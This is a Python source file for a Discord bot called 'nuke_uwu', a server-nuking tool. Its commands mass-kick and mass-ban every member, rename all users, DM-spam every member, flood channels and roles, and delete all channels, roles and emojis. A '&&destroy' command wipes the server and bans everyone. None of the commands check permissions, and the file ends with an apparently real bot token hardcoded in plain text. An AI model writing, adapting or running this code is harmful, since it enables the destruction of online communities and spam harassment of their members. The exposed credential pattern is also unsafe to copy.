# nuke_uwu #
#---------------------------------#
# Multi-function Discord bot coded in Python #
# Version: v1.1.9 #
#---------------------------------#

import discord
from discord.ext.commands import *
from discord.ext import commands
import random
import asyncio
import json
from itertools import cycle
import time
from threading import Thread
from random import randint
import datetime
import os
import aiohttp
import sys
import traceback
import json
from discord.utils import get


## --                    -- ##
## --   INITIALIZATION   -- ##
## --                    -- ##

print(f"Bot Status: Loading...")

## -- Declares the bot, passes it a prefix and lets it know to (hopefully) only listen to itself. -- ##
bot = commands.Bot(command_prefix='&&')
client = commands.Bot(command_prefix='&&')
bot.remove_command('help')

## -- Sets Global Variables -- ##
consoleDivider = "\n" + "\n" + "|======--------------------------------------------------------------------------------======|" + "\n"
consoleDividerSmall = "\n" + "|==---------------------------==|" + "\n"
consoleNewLine = " " #When you reference this in a print function, it will generate one empty line.
consoleSpace = "\n" #When you reference this in a print function, it will generate two empty lines.


commandRan = ""



## -- BOT IS READY -- ##
@bot.event
async def on_ready():
#BOT STATUS#
    print(f"Bot Status: Online!")






## --              -- ##
## --   COMMANDS   -- ##
## --              -- ##


## -- KICK SPECIFIC MEMBER -- ##
# Command: &&kick [@user] #
@bot.command(pass_context=True)
async def kick(ctx, user : discord.Member):
    #Sets commandRan to the command name
    commandRan = "&&kick"
    print (f"Command Called: {commandRan}")
    await ctx.guild.kick(user)
    print (f"{user.name} has been kicked from {ctx.guild.name}")
    print (f"Action Completed: {commandRan}")



## -- KICK ALL MEMBERS -- ##
# Command: &&kickAll #
@bot.command(pass_context=True)
async def kickAll(ctx):
    #Sets commandRan to the command name
    commandRan = "&&kickAll"
    print (f"Command Called: {commandRan}")

    #These variables are used to track the amount of times the command succeded and failed (try = succeeded, except = failed.)
    numberKicked = 0
    numberFailed = 0

    print (f"Attempting to kick all members from {ctx.guild.name}.")
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.kick(user)
            numberKicked += 1
            print (f"{user.name} has been kicked from {ctx.guild.name}")
        except:
            numberFailed += 1
            print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")

    # Command Info #
    print (consoleDivider)
    print (f"Details:")
    print (f" Executed command  -  {commandRan}")
    print (f" Server command was executed in  -  {ctx.guild.name}")
    print (consoleNewLine)
    print (f"Command Statistics:")
    print (f" {numberKicked}  -  Number of users kicked.")
    print (f" {numberFailed}  -  Number of users we failed to kick.")
    print (consoleNewLine)
    print (f"Successfuly kicked {numberKicked} members from {ctx.guild.name}!")
    print (consoleDivider)



## -- BAN SPECIFIC MEMBER -- ##
# Command: &&ban [@user] #
@bot.command(pass_context=True)
async def ban(ctx, user : discord.Member):
    #Sets commandRan to the command name
    commandRan = "&&ban"
    print (f"Command Called: {commandRan}")
    await ctx.guild.ban(user)
    print (f"{user.name} has been banned from {ctx.guild.name}")
    print (f"Action Completed: {commandRan}")



## -- BAN ALL MEMBERS -- ##
# Command: &&banAll #
@bot.command(pass_context=True)
async def banAll(ctx):
    #Sets commandRan to the command name
    commandRan = "&&banAll"
    print (f"Command Called: {commandRan}")
    print (f"Attempting to ban all members in {ctx.guild.name}.")

    #These variables are used to track the amount of times the command succeded and failed (try = succeeded, except = failed.)
    numberBanned = 0
    numberFailed = 0

    for user in list(ctx.guild.members):
        try:
            await ctx.guild.ban(user)
            numberBanned += 1
            print (f"{user.name} has been banned from {ctx.guild.name}")
        except:
            numberFailed += 1
            print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")

    # Command Info #
    print (consoleDivider)
    print (f"Details:")
    print (f" Executed command  -  {commandRan}")
    print (f" Server command was executed in  -  {ctx.guild.name}")
    print (consoleNewLine)
    print (f"Command Statistics:")
    print (f" {numberBanned}  -  Number of users banned.")
    print (f" {numberFailed}  -  Number of users we failed to ban.")
    print (consoleNewLine)
    print (f"Successfuly banned {numberBanned} members from {ctx.guild.name}!")
    print (consoleDivider)



## -- RENAME SINGULAR MEMBER -- ##
# Command: &&rename [@user] [name] #
@bot.command(pass_context=True)
async def rename(ctx, user : discord.Member, *, rename_to):
    #Sets commandRan to the command name
    commandRan = "&&rename"
    print (f"Command Called: {commandRan}")

    print (f"Attempting to rename {user.name} to '{rename_to}' in {ctx.guild.name}.")
    #Attempts to rename specified user to the variable/name you passed in.
    #If name to rename user to contains "reset", reset the users nickname to username.
    if ("reset" in rename_to):
        print (f"The nickname of '{user.name}' has been reset in {ctx.guild.name}.")
        await user.edit(nick=None)
    #Otherwise, set the user's nickname to the specified username.
    else:
        try:
            await user.edit(nick=rename_to)
            print (f"'{user.name}' has been renamed to '{rename_to}' in {ctx.guild.name}.")
        except:
            print (f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}. Do you have the required permissions to rename this user?")

    # Command Info #
    print (consoleDivider)
    print (f"Details:")
    print (f" Executed command  -  {commandRan}")
    print (f" Server command was executed in  -  {ctx.guild.name}")
    print (consoleNewLine)
    print (f"Command Statistics:")
    print (f" {user.name}  -  User you're attempting to rename.")
    print (f" '{rename_to}'  -  What you're attempting to rename the user.")
    print (consoleNewLine)
    print (f"Successfuly renamed {user.name} to '{rename_to}' in {ctx.guild.name}!")
    print (consoleDivider)



## -- RENAME ALL MEMBERS -- ##
#Command: &&renameAll [name] #
@bot.command(pass_context=True)
async def renameAll(ctx, *, rename_to):
    #Sets commandRan to the command name
    commandRan = "&&renameAll"
    print (f"Command Called: {commandRan}")

    #These variables are used to track the amount of times the command succeded and failed (try = succeeded, except = failed.)
    numberRenamed = 0
    numberReset = 0
    numberFailed = 0

    print (f"Attempting to rename all users to '{rename_to}' in {ctx.guild.name}.")    
    #Runs through each user in the list of guild members and attempts to rename them to the variable/name you passed in.
    #If name to rename user to contains "reset", reset the all the user's nickname's to their original username.
    if ("reset" in rename_to):
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick=None)
                numberReset += 1
                print (f"The nickname of '{user.name}' has been reset in {ctx.guild.name}.")
            except:
                numberFailed += 1
                print (f"Could not reset the nickname of {user.name} in {ctx.guild.name}. Do you have the required permissions to rename this user?")
    #Otherwise, set all the user's nickname's to specified username.
    else:
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick=rename_to)
                numberRenamed += 1
                print (f"'{user.name}' has been renamed to '{rename_to}' in {ctx.guild.name}.")
            except:
                numberFailed += 1
                print (f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}. Do you have the required permissions to rename this user?")

    # Command Info #
    print (consoleDivider)
    print (f"Details:")
    print (f" Executed command  -  {commandRan}")
    print (f" Server command was executed in  -  {ctx.guild.name}")
    print (consoleNewLine)
    print (f"Command Statistics:")
    print (f" {numberRenamed}  -  Number of users successfuly renamed to '{rename_to}'.")
    print (f" {numberReset}  -  Number of users successfuly reset to their original username.")
    print (f" {numberFailed}  -  Number of users that failed to renamed to '{rename_to}'.")
    print (consoleNewLine)
    print (f"Successfuly renamed {numberRenamed} users to '{rename_to}' in {ctx.guild.name}!")
    print (consoleDivider)



## -- MESSAGE SINGULAR MEMBER -- ##
# Command: &&dm [@user] [message] #
@bot.command(pass_context=True)
async def dm(ctx, user : discord.Member, *, message):
    #Sets commandRan to the command name
    commandRan = "&&dm"
    print (f"Command Called: {commandRan}")

    print (f"Attempting to DM {user.name} the message '{message}' in {ctx.guild.name}.")

    try:
        await user.send(message)
        print(f"{user.name} has recieved the message '{message}'.")
    except:
        print(f"{user.name} has NOT recieved the message '{message}'.")
    print (f"Successfuly DM'd {user.name} the message '{message}' in {ctx.guild.name}.")
    print ("Action Completed: &&dm")



## -- MESSAGE ALL MEMBERS -- ##
# Command: &&dmAll [message] #
@bot.command(pass_context=True)
async def dmAll(ctx, *, message):
    #Sets commandRan to the command name
    commandRan = "&&dmAll"
    print (f"Command Called: {commandRan}")

    #These variables are used to track the amount of times the command succeded and failed (try = succeeded, except = failed.)
    numberMessaged = 0
    numberFailed = 0

    print (f"Attempting to DM all members the message '{message}' in {ctx.guild.name}.")
    for user in ctx.guild.members:
        try:
            await user.send(message)
            numberMessaged += 1
            print(f"{user.name} has recieved the message '{message}'.")
        except:
            numberFailed += 1
            print(f"{user.name} has NOT recieved the message '{message}'.")

    # Command Info #
    print (consoleDivider)
    print (f"Details:")
    print (f" Executed command  -  {commandRan}")
    print (f" Server command was executed in  -  {ctx.guild.name}")
    print (consoleNewLine)
    print (f"Command Statistics:")
    print (f" {numberMessaged}  -  Number of users successfuly private messaged with '{message}'.")
    print (f" {numberFailed}  -  Number of users that failed to be private messaged.")
    print (consoleNewLine)
    print (f"Successfuly DM'd the message '{message}' to all members in {ctx.guild.name}.")
    print (consoleDivider)



## -- SPAM MESSAGE -- ##
#Command: &&spam [amount] [message] #
@bot.command(pass_context=True)
async def spam(ctx, amount, *, message):
    #Sets commandRan to the command name
    commandRan = "&&spam"
    print (f"Command Called: {commandRan}")

    print (f"Attempting to spam '{message}' {amount} times in {ctx.guild.name}.")
    amountOfTimes = int(amount)
    count = 0
    while count < amountOfTimes:
        try:
            await ctx.send(message)
            count += 1
        except:
            print(f"Could not spam '{message}' {amount} amount of times.")

    # Command Info #
    print (consoleDivider)
    print (f"Details:")
    print (f" Executed command  -  {commandRan}")
    print (f" Server command was executed in  -  {ctx.guild.name}")
    print (consoleNewLine)
    print (f"Command Statistics:")
    print (f" '{message}'  -  Message spammed.")
    print (f" {amount}  -  Amount of time(s) spammed.")
    print (consoleNewLine)
    print(f"Successfuly spammed '{message}' {amount} amount of times in {ctx.guild.name}!")
    print (consoleDivider)



## -- SPAM CREATE ROLES -- ##
# Command: &&rolespam [amount] [roleName]  #
@bot.command(pass_context=True)
async def rolespam(ctx, amount, *, roleName):
    #Sets commandRan to the command name
    commandRan = "&&rolespam"
    print (f"Command Called: {commandRan}")

    print (f"Attempting to create {amount} versions of a role called '{roleName}' in {ctx.guild.name}.")
    amountOfTimes = int(amount)
    count = 0
    while count < amountOfTimes:
        try:
            guild = ctx.message.guild
            await guild.create_role(name=roleName)
            count += 1
        except:
            print(f"Could not create {amount} versions of a role called '{roleName}' in {ctx.guild.name}.")

    # Command Info #
    print (consoleDivider)
    print (f"Details:")
    print (f" Executed command  -  {commandRan}")
    print (f" Server command was executed in  -  {ctx.guild.name}")
    print (consoleNewLine)
    print (f"Command Statistics:")
    print (f" '{roleName}'  -  Created role's name.")
    print (f" {amount}  -  Amount of roles created.")
    print (consoleNewLine)
    print(f"Successfuly created {amount} versions of a role called '{roleName}' in {ctx.guild.name}.")
    print (consoleDivider)



## -- SPAM CREATE CHANNELS -- ##
# Command: &&channelspam [amount] [channelName] #
@bot.command(pass_context=True)
async def channelspam(ctx, amount, *, channelName):
    #Sets commandRan to the command name
    commandRan = "&&channelspam"
    print (f"Command Called: {commandRan}")

    print (f"Attempting to create {amount} versions of a text channel called '{channelName}' in {ctx.guild.name}.")
    amountOfTimes = int(amount)
    count = 0
    while count < amountOfTimes:
        try:
            guild = ctx.message.guild
            await guild.create_text_channel(channelName)
            count += 1
        except:
            print(f"Could not create {amount} versions of a text channel called '{channelName}' in {ctx.guild.name}.")

    # Command Info #
    print (consoleDivider)
    print (f"Details:")
    print (f" Executed command  -  {commandRan}")
    print (f" Server command was executed in  -  {ctx.guild.name}")
    print (consoleNewLine)
    print (f"Command Statistics:")
    print (f" '{channelName}'  -  Created channel's name.")
    print (f" {amount}  -  Amount of channels created.")
    print (consoleNewLine)
    print(f"Successfuly created {amount} versions of a text channel called '{channelName}' in {ctx.guild.name}.")
    print (consoleDivider)



## -- LIST ALL ___ -- ##
#Command: &&listAll [condition] #
@bot.command(pass_context=True)
async def listAll(ctx, condition):
        if condition.lower() == "channels":
            #Sets commandRan to the command name
            commandRan = "&&listAll channels"
            print (f"Command Called: {commandRan}")

            #These variables are used to track the amount of times the command succeded and failed (try = succeeded, except = failed.)
            numberChannels = 0
            numberFailed = 0

            print (f"All channels in {ctx.guild.name}:")
            for channel in list(ctx.guild.channels):
                try:
                    print (f" - {channel.name}")
                    numberChannels += 1
                except:
                    numberFailed += 1
                    print (f"You do not have permission to list channels in {ctx.guild.name}.")
            
            # Command Info #
            print (consoleDivider)
            print (f"Executed command - {commandRan}")
            print (consoleNewLine)
            print (f"Statistics:")
            print (f" {numberChannels}  -  Number of channels in {ctx.guild.name}.")
            print (f" {numberFailed}  -  Number of channels that failed to be retrieved.")
            print (consoleDivider)


        elif condition.lower() == "roles":
            #Sets commandRan to the command name
            commandRan = "&&listAll roles"
            print (f"Command Called: {commandRan}")

            #These variables are used to track the amount of times the command succeded and failed (try = succeeded, except = failed.)
            numberRoles = 0
            numberFailed = 0

            print (f"All roles in {ctx.guild.name}:")
            for role in list(ctx.guild.roles):
                try:
                    print (f" - {role.name}")
                    numberRoles += 1
                except:
                    numberFailed += 1
                    print (f"You do not have permission to list roles in {ctx.guild.name}.")
          
            # Command Info #
            print (consoleDivider)
            print (f"Executed command - {commandRan}")
            print (consoleNewLine)
            print (f"Statistics:")
            print (f" {numberRoles}  -  Number of roles in {ctx.guild.name}.")
            print (f" {numberFailed}  -  Number of roles that failed to be retrieved.")
            print (consoleDivider)


        elif condition.lower() == "emojis":
            #Sets commandRan to the command name
            commandRan = "&&listAll emojis"
            print (f"Command Called: {commandRan}")

            #These variables are used to track the amount of times the command succeded and failed (try = succeeded, except = failed.)
            numberEmojis = 0
            numberFailed = 0

            print (f"All emojis in {ctx.guild.name}:")
            for emoji in list(ctx.guild.emojis):
                try:
                    print (f" - {emoji.name}")
                    numberEmojis += 1
                except:
                    numberFailed += 1
                    print (f"You do not have permission to list emojis in {ctx.guild.name}.")

            # Command Info #
            print (consoleDivider)
            print (f"Executed command - {commandRan}")
            print (consoleNewLine)
            print (f"Statistics:")
            print (f" {numberEmojis}  -  Number of emojis in {ctx.guild.name}.")
            print (f" {numberFailed}  -  Number of emojis that failed to be retrieved.")
            print (consoleDivider)


        elif condition.lower() == "all":
            #Sets commandRan to the command name
            commandRan = "&&listAll all"
            print (f"Command Called: {commandRan}")

            #These variables are used to track the amount of times the command succeded and failed (try = succeeded, except = failed.)
            numberChannels = 0
            numberChannelsFailed = 0
            numberRoles = 0
            numberRolesFailed = 0
            numberEmojis = 0
            numberEmojisFailed = 0

            print (f"Listing all channels, roles, and emojis in {ctx.guild.name}:")
            print (f"All channels in {ctx.guild.name}:")
            for channel in list(ctx.guild.channels):
                try:
                    print (f" - {channel.name}")
                    numberChannels += 1
                except:
                    numberChannelsFailed += 1
                    print (f"You do not have permission to list channels in {ctx.guild.name}.")
            
            print (f"All roles in {ctx.guild.name}:")
            for role in list(ctx.guild.roles):
                try:
                    print (f" - {role.name}")
                    numberRoles += 1
                except:
                    numberRolesFailed += 1
                    print (f"You do not have permission to list roles in {ctx.guild.name}.")
            
            print (f"All emojis in {ctx.guild.name}:")
            for emoji in list(ctx.guild.emojis):
                try:
                    print (f" - {emoji.name}")
                    numberEmojis += 1
                except:
                    numberEmojisFailed += 1
                    print (f"You do not have permission to list emojis in {ctx.guild.name}.")
            
            # Command Info #
            print (consoleDivider)
            print (f"Executed command - {commandRan}")
            print (consoleNewLine)
            print (f"Statistics:")
            print (f" {numberChannels}  -  Number of channels in {ctx.guild.name}.")
            print (f" {numberRoles}  -  Number of roles in {ctx.guild.name}.")
            print (f" {numberEmojis}  -  Number of emojis in {ctx.guild.name}.")
            print (f" {numberChannelsFailed}  -  Number of channels that failed to be retrieved.")
            print (f" {numberRolesFailed}  -  Number of roles that failed to be retrieved.")
            print (f" {numberEmojisFailed}  -  Number of emojis that failed to be retrieved.")
            print (consoleDivider)


## -- DELETE ALL ___ -- ##
#Command: &&deleteAll [condition] #
@bot.command(pass_context=True)
async def deleteAll(ctx, condition):
        if condition.lower() == "channels":
            print ("Command Called: &&deleteAll channels")
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print (f"{channel.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
            print ("Command Completed: &&deleteAll channels")
        elif condition.lower() == "roles":
            print ("Command Called: &&deleteAll roles")
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print (f"{role.name} has been deleted in {ctx.guild.name}")
                except discord.Forbidden:
                    print (f"You do not have permission to delete {role.name} in {ctx.guild.name}. Is this role above nuke-uwu?")
                except discord.HTTPException:
                    print (f"Deleting {role.name} in {ctx.guild.name} failed. Is this a bot role?")
            print ("Command Completed: &&deleteAll roles")
        elif condition.lower() == "emojis":
            print ("Command Called: &&deleteAll emojis")
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print (f"{emoji.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
            print ("Command Completed: &&deleteAll Emojis")
        elif condition.lower() == "all":
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print (f"{channel.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print (f"{role.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print (f"{emoji.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: deleteAll all")



## -- DESTROYS SERVER -- ##
#Command: &&destroy #
@bot.command(pass_context=True)
async def destroy(ctx):
    await ctx.message.delete()
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} has been deleted in {ctx.guild.name}")
        except:
            print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            print (f"{channel.name} has been deleted in {ctx.guild.name}")
        except:
            print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted in {ctx.guild.name}")
        except:
            print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.ban(user)
            print (f"{user.name} has been banned from {ctx.guild.name}")
        except:
            print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
    print ("Action Completed: destroy")



## -- STARTS THE BOT BY PASSING APPLICATION TOKEN -- ##
bot.run ("NTk5NTQ0NjAzNjY1NzYwMjc2.XSm6hg.jtu5mtQdbb5HwgaITBsZbIQPN2U")